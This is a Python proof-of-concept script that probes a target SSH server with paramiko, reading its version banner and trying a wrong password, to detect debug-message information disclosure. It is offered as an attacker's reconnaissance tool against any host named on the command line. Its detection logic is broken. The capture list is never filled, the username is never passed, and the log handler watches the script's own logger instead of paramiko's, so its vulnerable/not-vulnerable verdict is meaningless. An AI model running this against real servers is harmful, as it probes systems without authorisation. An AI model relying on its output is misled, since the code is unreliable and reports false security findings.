#!/usr/bin/env python3
"""
Proof-of-Concept: SSH Debug Message Information Disclosure

This script demonstrates how an attacker can trigger SSH_MSG_DEBUG messages
during the authentication phase to extract sensitive host information.

RFC 4251 Section 9.4.2 warns:
"Special care should be taken when designing debug messages. These messages 
may reveal surprising amounts of information about the host if not properly designed."

The script connects to an SSH server and attempts to trigger debug responses
by sending specific requests or observing the banner/handshake phase.
"""
import paramiko
import sys
import logging

# Configure logging to capture raw protocol messages
logging.basicConfig(level=logging.DEBUG, format='%(levelname)s: %(message)s')
logger = logging.getLogger('SSHDebugPoc')

def trigger_debug_messages(hostname, port=22, username=None):
    """
    Attempts to trigger SSH debug messages during connection setup.
    
    Args:
        hostname (str): Target SSH server hostname or IP.
        port (int): SSH server port.
        username (str, optional): Username for authentication attempt.
    
    Returns:
        list: List of captured debug message strings.
    """
    debug_messages = []
    
    # Create a custom transport to intercept messages
    try:
        sock = paramiko.Transport((hostname, port))
        sock.start_client()
        
        # Get the server's version string (often contains OS/version info)
        remote_version = sock.remote_version
        local_version = sock.local_version
        print(f"[+] Server Version: {remote_version}")
        print(f"[+] Client Version: {local_version}")
        
        # Attempt to trigger debug messages by sending a SSH_MSG_DEBUG request
        # Note: In standard SSH, the server sends debug messages proactively.
        # We can also try to force one by using an invalid authentication method
        # or specific client flags if supported, but primarily we observe what the
        # server pushes during the handshake.
        
        # Some servers respond with debug info when encountering errors or
        # during key exchange. We'll attempt a basic connection and capture logs.
        
        # To actively trigger, we can try to request a channel or use specific
        # client behaviors that might elicit debug responses.
        # However, the most reliable way is often just observing the handshake
        # if the server is misconfigured to send verbose info.
        
        # Let's try to authenticate with wrong credentials to see if debug info leaks
        if username:
            print(f"[+] Attempting authentication with user: {username} (wrong password)...")
            try:
                sock.auth_password(username=username, password="incorrect_password")
            except paramiko.AuthenticationException:
                pass # Expected failure
            except Exception as e:
                logger.debug(f"Auth error triggered debug-like response: {e}")
        
        # Check if any debug messages were logged by the transport layer
        # Paramiko logs SSH_MSG_DEBUG internally. We can capture them via logging.
        
    except paramiko.SSHException as e:
        logger.error(f"SSH Error: {e}")
    finally:
        try:
            sock.close()
        except:
            pass
    
    return debug_messages

def analyze_debug_leak(hostname, port=22):
    """
    Main function to run the PoC and analyze results.
    """
    print(f"[*] Targeting {hostname}:{port}")
    print("[!] Note: This script captures debug messages logged by the SSH transport layer.")
    print("[!] If the server is vulnerable, sensitive info may appear in logs or responses.")
    
    # Capture logging output to detect debug messages
    class LogCapture(logging.Handler):
        def __init__(self):
            super().__init__()
            self.messages = []
        
        def emit(self, record):
            if 'DEBUG' in str(record.levelname) or 'SSH_MSG_DEBUG' in record.getMessage():
                self.messages.append(record.getMessage())
    
    handler = LogCapture()
    logger.addHandler(handler)
    
    # Trigger connection
    trigger_debug_messages(hostname, port=port)
    
    print(f"\n[+] Analysis Complete.")
    if handler.messages:
        print(f"[!] VULNERABLE: Captured {len(handler.messages)} debug/log messages that may contain sensitive info:")
        for msg in handler.messages[:5]: # Show first 5
            print(f"    - {msg}")
        return True
    else:
        print("[-] NOT VULNERABLE: No suspicious debug messages captured during handshake.")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <hostname> [port]")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    
    is_vulnerable = analyze_debug_leak(target_host, target_port)
    sys.exit(0 if not is_vulnerable else 1)